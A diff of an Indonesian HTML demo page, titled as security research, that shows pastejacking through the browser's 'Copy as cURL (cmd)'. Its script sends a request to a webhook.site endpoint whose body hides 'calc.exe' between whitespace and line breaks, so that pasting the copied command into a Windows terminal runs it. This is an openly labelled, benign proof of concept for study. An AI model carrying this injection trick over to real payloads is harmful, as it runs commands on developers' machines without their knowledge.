@@ -1,25 +1,50 @@
-<body> Open network tab and copy all as curl (cmd) </body>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penelitian Keamanan - Clipboard Test</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.6; padding: 20px; }
+        code { background: #f4f4f4; padding: 2px 5px; border-radius: 3px; }
+        .highlight { color: #d63384; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>Uji Coba Clipboard Hijacking</h1>
+    <p>Gunakan halaman ini untuk mempelajari bagaimana karakter tersembunyi bekerja dalam <code>cURL</code>.</p>
+    
+    <ol>
+        <li>Buka <b>Developer Tools</b> (Tekan <code>F12</code> atau <code>Ctrl+Shift+I</code>).</li>
+        <li>Buka tab <b>Network</b>.</li>
+        <li>Refresh halaman ini.</li>
+        <li>Cari request bernama <span class="highlight">296ab085-b125-4e08-b231-4efd7c2dc2e2</span>.</li>
+        <li>Klik kanan pada request tersebut > <b>Copy</b> > <b>Copy as cURL (cmd)</b>.</li>
+        <li>Tempel (Paste) hasil salinan ke Notepad untuk melihat payload tersembunyi.</li>
+    </ol>
 
-<script>
-fetch("/", {
-"credentials": "omit",
-"headers": {
-"Accept-Language": "en-US",
-"Content-Type": "text/plain",
-},
-"body": "\t \t\t \r\ncalc.exe \t \t\f\v",
-"method": "POST",
-});
+    <script>
+        // Endpoint Webhook.site milikmu
+        const webhookUrl = "https://webhook.site/296ab085-b125-4e08-b231-4efd7c2dc2e2";
+        
+        // Payload: karakter whitespace + newline + perintah + whitespace
+        // \r\n adalah karakter 'Enter' yang akan memutus baris di terminal
+        const payload = "\t \t\t \r\ncalc.exe\r\n \t \t\f\v";
 
-
-fetch("/copy-me", {
-"credentials": "omit",
-"headers": {
-"Accept-Language": "en-US",
-"Content-Type": "text/plain",
-},
-"body": "\t \t\t \r\ncalc.exe \t \t\f\v",
-"method": "POST",
-});
-
-</script>
+        fetch(webhookUrl, {
+            "method": "POST",
+            "headers": {
+                "Content-Type": "text/plain",
+                "Accept-Language": "en-US",
+                "X-Custom-Test": "Pastejacking-Demo"
+            },
+            "body": payload,
+            "mode": "cors"
+        }).then(response => {
+            console.log("Status pengiriman ke Webhook.site:", response.status);
+        }).catch(err => {
+            console.error("Gagal mengirim request:", err);
+        });
+    </script>
+</body>
+</html>
